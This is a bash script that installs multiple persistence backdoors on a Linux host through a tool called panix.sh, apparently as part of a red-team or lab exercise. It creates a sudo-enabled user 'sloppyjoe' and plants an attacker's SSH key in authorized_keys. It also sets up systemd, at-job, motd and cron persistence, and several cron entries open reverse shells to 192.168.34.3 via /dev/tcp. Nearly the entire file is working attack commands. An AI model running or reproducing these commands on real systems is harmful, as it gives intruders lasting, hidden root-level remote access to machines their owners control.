#!/bin/bash



# Create Admin User sloppyjoe
adduser --disabled-password --gecos "" "sloppyjoe" >/dev/null
usermod -aG sudo,adm "sloppyjoe" >/dev/null
 
# Service creation
bash /tmp/totally-innocent/panix.sh -q --systemd --default --ip 192.168.34.3 --port 4445 >/dev/null 
 
# at job creation
bash /tmp/totally-innocent/panix.sh -q --at --default --ip 192.168.34.3 --port 4446 --time "now + 24 hours" >/dev/null
 
# authorized_keys persistence
##authorized_keys for user
bash /tmp/totally-innocent/panix.sh -q --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" >/dev/null
##authorized_keys for sloppyjoe (needs sudo)
bash /tmp/totally-innocent/panix.sh -q --authorized-keys --custom --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" --path /home/sloppyjoe/.ssh/authorized_keys
#cron   
bash /tmp/totally-innocent/panix.sh --cron --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4447 0>&1'" --daily --name "evil_cron_job" >/dev/null
 
bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4448 0>&1'" --crond --name "evil_cron_job" >/dev/null
 
bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4449 0>&1'" --crontab >/dev/null

#motd
bash /tmp/totally-innocent/panix.sh --motd --default --ip 192.168.34.3 --port 4450

#ssh-key
##for sloppy joe
bash /tmp/totally-innocent/panix.sh --ssh-key --cutom --user sloppyjoe
##for default in case not sudo
bash /tmp/totally-innocent/panix.sh --ssh-key --default


 
